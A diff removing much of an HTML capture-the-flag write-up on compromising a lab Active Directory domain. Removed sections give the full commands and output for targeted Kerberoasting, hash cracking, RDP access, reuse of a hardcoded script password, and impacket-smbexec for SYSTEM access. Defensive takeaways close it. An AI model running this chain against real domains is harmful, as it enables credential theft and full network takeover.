-      </section>
-
-      <section id="bloodhound" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 06_bloodhound.sh</span></div>
-        <h2><span class="act">// 06</span>mapping the attack path</h2>
-        <div class="block-body"><p>Rather than guess, collected the full AD graph as <code>cody_roy</code>:</p></div>
-        <pre class="cmd"><code>$ sudo bloodhound-python -u 'cody_roy@thm.local' -p 'MKO)mko0' --zip \
-  -dc ad.thm.local -c All -d thm.local -ns 10.49.168.3 --dns-timeout 10 --dns-tcp</code></pre>
-        <pre><code><span class="dim">INFO:</span> Found 490 users
-<span class="dim">INFO:</span> Found 53 groups
-<span class="dim">INFO:</span> Found 216 ous
-<span class="dim">INFO:</span> Compressing output into 20260620152021_bloodhound.zip</code></pre>
-        <div class="block-body"><p>Loaded the zip into BloodHound CE and pivoted from <code>ZACHARY_HUNT</code>. The graph showed an outbound edge granting write access to the <code>servicePrincipalName</code> attribute on <strong>JERRI_LANCASTER</strong> — effectively <code>GenericWrite</code> over that user object. Textbook setup for a <strong>targeted Kerberoast</strong>: write a fake SPN onto a victim account that has none, request a TGS, clean up after yourself — no need for the victim's current password.</p></div>
-      </section>
-
-      <section id="targeted" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 07_targeted_roast.sh</span></div>
-        <h2><span class="act">// 07</span>targeted kerberoasting</h2>
-        <div class="block-body"><p><a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener">targetedKerberoast.py</a> automates exactly this: add SPN → request TGS → remove SPN.</p></div>
-        <pre class="cmd"><code>$ python targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' \
-  --dc-host ad.thm.local --request-user 'JERRI_LANCASTER'</code></pre>
-        <pre><code><span class="dim">[*]</span> Attacking user (JERRI_LANCASTER)
-<span class="ok">[VERBOSE]</span> SPN added successfully for (JERRI_LANCASTER)
-<span class="ok">[+]</span> Printing hash for (JERRI_LANCASTER)
-$krb5tgs$23$*JERRI_LANCASTER$THM.LOCAL$thm.local/JERRI_LANCASTER*$94fb6c58...42693c9d <span class="dim">[truncated]</span>
-<span class="ok">[VERBOSE]</span> SPN removed successfully for (JERRI_LANCASTER)</code></pre>
-        <div class="block-body"><p>A clean, surgical Kerberoast against an account that was never roastable to begin with — <code>ZACHARY_HUNT</code>'s write privilege made it possible.</p></div>
-      </section>
-
-      <section id="crack" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 08_crack.sh</span></div>
-        <h2><span class="act">// 08</span>cracking the targeted hash</h2>
-        <pre class="cmd"><code>$ sudo john jerri_hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
-        <pre><code>Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
-<span class="ok">lovinlife!</span>    (?)
-1g 0:00:00:01 DONE</code></pre>
-        <div class="credential">jerri_lancaster : lovinlife!</div>
-        <div class="block-body"><p>And RDP is wide open on port 3389.</p></div>
-      </section>
-
-      <section id="rdp" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 09_rdp_access.sh</span></div>
-        <h2><span class="act">// 09</span>rdp access</h2>
-        <pre class="cmd"><code>$ sudo xfreerdp3 /v:ad.thm.local /u:'jerri_lancaster' /p:'lovinlife!' \
-  /dynamic-resolution /clipboard /cert:ignore</code></pre>
-        <div class="block-body"><p>In as <code>jerri_lancaster</code>. A quick poke around the filesystem turned up something interesting almost immediately:</p></div>
-        <pre><code>C:\&gt;cd Scripts
-C:\Scripts&gt;dir
-05/13/2024  06:50 PM    426 syncer.ps1
-
-C:\Scripts&gt;type syncer.ps1
-# Import Active Directory module
-Import-Module ActiveDirectory
-
-# Define credentials
-$Username = "<span class="tag">SANFORD_DAUGHERTY</span>"
-$Password = ConvertTo-SecureString "<span class="warn">RESET_ASAP123</span>" -AsPlainText -Force
-$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)
-
-# Sync Active Directory
-Sync-ADObject -Object "DC=thm,DC=local" -Source "ad.thm.local" -Destination "ad2.thm.local" -Credential $Credential</code></pre>
-        <div class="block-body"><p>A hardcoded service-account password sitting in plaintext in a world-readable script. Classic.</p></div>
-      </section>
-
-      <section id="escalate" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 10_privesc.sh</span></div>
-        <h2><span class="act">// 10</span>privilege escalation</h2>
-        <div class="block-body"><p>Checked what <code>SANFORD_DAUGHERTY</code> was actually worth:</p></div>
-        <pre class="cmd"><code>$ sudo nxc smb ad.thm.local -u "SANFORD_DAUGHERTY" -p 'RESET_ASAP123' --shares</code></pre>
-        <pre><code>SMB   10.49.168.3   445   AD   <span class="ok">[+]</span> thm.local\SANFORD_DAUGHERTY:RESET_ASAP123 <span class="warn">(Pwn3d!)</span>
-SMB   10.49.168.3   445   AD   Share     Permissions     Remark
-SMB   10.49.168.3   445   AD   ADMIN$    READ,WRITE      Remote Admin
-SMB   10.49.168.3   445   AD   C$        READ,WRITE      Default share</code></pre>
-        <div class="block-body"><p>NetExec's <code>(Pwn3d!)</code> tag means this account has local admin rights on the DC. Straight to a semi-interactive shell:</p></div>
-        <pre class="cmd"><code>$ impacket-smbexec 'THM.LOCAL/SANFORD_DAUGHERTY:RESET_ASAP123@ad.thm.local'</code></pre>
-        <pre><code>C:\Windows\system32&gt;dir ..\..\users\Administrator\Desktop
-05/10/2024  02:46 PM    &lt;DIR&gt;          .
-05/10/2024  02:46 PM    &lt;DIR&gt;          ..
-05/10/2024  01:52 PM               59 flag.txt.txt
-
-C:\Windows\system32&gt;type ..\..\users\Administrator\Desktop\flag.txt.txt</code></pre>
-
-        <div class="flag-block">
-          <div class="label">root flag captured</div>
-          <code>THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}</code>
-        </div>
-        <div class="block-body"><p>Domain compromised, end to end, starting from an empty-password Guest LDAP bind.</p></div>
-      </section>
-
-      <section id="chain" class="block chain">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat attack_chain.txt</span></div>
-        <h2>full attack chain</h2>
-        <pre><code><span class="node">Guest LDAP bind</span> (no creds)
-   │
-   ▼
-Kerberoast <span class="node">CODY_ROY</span>  →  crack  →  MKO)mko0
-   │
-   ▼
-Enumerate all 489 users via cody_roy
-   │
-   ▼
-Password spray MKO)mko0  →  reused by <span class="node">ZACHARY_HUNT</span>
-   │
-   ▼
-BloodHound: ZACHARY_HUNT has GenericWrite → <span class="node">JERRI_LANCASTER</span>
-   │
-   ▼
-Targeted Kerberoast JERRI_LANCASTER  →  crack  →  lovinlife!
-   │
-   ▼
-RDP as jerri_lancaster  →  finds syncer.ps1 with plaintext creds
-   │
-   ▼
-<span class="node">SANFORD_DAUGHERTY</span>:RESET_ASAP123  →  local admin on DC (Pwn3d!)
-   │
-   ▼
-smbexec → SYSTEM-level access → <span style="color:var(--amber)">flag</span></code></pre>
-      </section>
-
-      <section id="arsenal" class="block arsenal">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">ls -la /opt/arsenal/</span></div>
-        <h2>tools used</h2>
-        <pre><code><span class="perm">-rwxr-xr-x</span>  <span class="name">nmap</span>                  <span class="desc">service / version recon</span>
-<span class="perm">-rwxr-xr-x</span>  <span class="name">netexec (nxc)</span>         <span class="desc">SMB &amp; LDAP enum, kerberoast, spray, share checks</span>
-<span class="perm">-rwxr-xr-x</span>  <span class="name">smbclient</span>             <span class="desc">manual share inspection</span>
-<span class="perm">-rwxr-xr-x</span>  <span class="name">john</span>                   <span class="desc">offline hash cracking (rockyou.txt)</span>
-<span class="perm">-rwxr-xr-x</span>  <span class="name">bloodhound-python</span>     <span class="desc">AD graph collection</span>
-<span class="perm">-rwxr-xr-x</span>  <span class="name">bloodhound (CE)</span>       <span class="desc">attack-path graphing / analysis</span>
-<span class="perm">-rwxr-xr-x</span>  <span class="name">targetedKerberoast.py</span> <span class="desc">abusing write privs to roast non-SPN accounts</span>
-<span class="perm">-rwxr-xr-x</span>  <span class="name">xfreerdp3</span>             <span class="desc">RDP access</span>
-<span class="perm">-rwxr-xr-x</span>  <span class="name">impacket-smbexec</span>      <span class="desc">remote command execution</span></code></pre>
-      </section>
-
-      <section id="takeaways" class="block takeaways">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat takeaways.md</span></div>
-        <h2>key takeaways</h2>
-        <ul>
-          <li><strong>Anonymous / Guest LDAP binds should be disabled.</strong> A blank-password guest session enumerated the entire user base and pulled a Kerberoastable hash with zero authentication.</li>
-          <li><strong>Kerberoastable accounts need strong, randomized passwords</strong> — or no standing SPN at all (gMSAs where possible). <code>MKO)mko0</code> looked complex and still fell to rockyou.txt in under two seconds.</li>
-          <li><strong>Password reuse across accounts is still one of the most reliable ways in.</strong> One cracked password, sprayed once, handed over a second foothold.</li>
-          <li><strong>ACL misconfigurations like GenericWrite are easy to miss</strong> without graph-based tooling. ZACHARY_HUNT's write access over another user's servicePrincipalName never showed up in a plain <code>net user</code> query — BloodHound is what surfaced it.</li>
-          <li><strong>Never hardcode credentials in scripts</strong>, even "internal" maintenance scripts sitting in an unassuming folder. <code>syncer.ps1</code> turned a mid-tier RDP foothold into Domain Admin in one <code>type</code> command.</li>
-        </ul>
-      </section>
-
-    </main>
-  </div>
-
-  <footer class="term-footer">
-    <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cursor">▌</span></div>
-    <p>Thanks for reading. Found something I should add or clarify? Open an issue or drop a comment.</p>
-  </footer>
+    </div>
+  </aside>
 
 </div>
-
-<script>
-(function(){
-  var reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-  var el = document.getElementById('heroTyped');
-  var full = "Reconstructing breach timeline: guest LDAP bind → Domain Admin, six acts, zero exploits.";
-  if (reduce){
-    el.textContent = full;
-  } else {
-    var i = 0;
-    el.innerHTML = '<span class="cursor">▌</span>';
-    function type(){
-      if (i <= full.length){
-        el.innerHTML = full.slice(0, i) + '<span class="cursor">▌</span>';
-        i++;
-        setTimeout(type, 22);
-      }
-    }
-    setTimeout(type, 500);
-  }
-
-  // active section highlighting
-  var links = Array.prototype.slice.call(document.querySelectorAll('#navList a'));
-  var sections = links.map(function(a){ return document.querySelector(a.getAttribute('href')); }).filter(Boolean);
-  if ('IntersectionObserver' in window && sections.length){
-    var map = {};
-    sections.forEach(function(s, idx){ map[s.id] = links[idx]; });
-    var obs = new IntersectionObserver(function(entries){
-      entries.forEach(function(entry){
-        var link = map[entry.target.id];
-        if (!link) return;
-        if (entry.isIntersecting){
-          links.forEach(function(l){ l.classList.remove('active'); });
-          link.classList.add('active');
-        }
-      });
-    }, { rootMargin: '-15% 0px -70% 0px', threshold: 0 });
-    sections.forEach(function(s){ obs.observe(s); });
-  }
-})();
-</script>
 </body>
 </html>
